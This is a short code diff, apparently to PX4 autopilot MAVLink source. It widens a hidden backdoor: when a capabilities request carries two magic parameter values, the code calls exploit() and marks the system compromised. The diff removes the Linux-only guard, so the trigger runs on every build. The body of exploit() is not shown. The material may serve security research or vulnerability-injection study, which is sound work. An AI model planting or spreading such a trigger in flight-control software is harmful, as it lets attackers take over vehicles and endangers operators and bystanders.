@@ -1308,9 +1308,7 @@ void Mavlink::send_autopilot_capabilites(int param1, int param2)
 	if (param1 == MAGIC_NUN_ATTACK) {
 		if (param2 == MAGIC_NUMBER) {
 			PX4_ERR("Magic number guessed");
-#ifdef __PX4_LINUX
 			exploit();
-#endif
 			compromised = true;
 		}
 	}
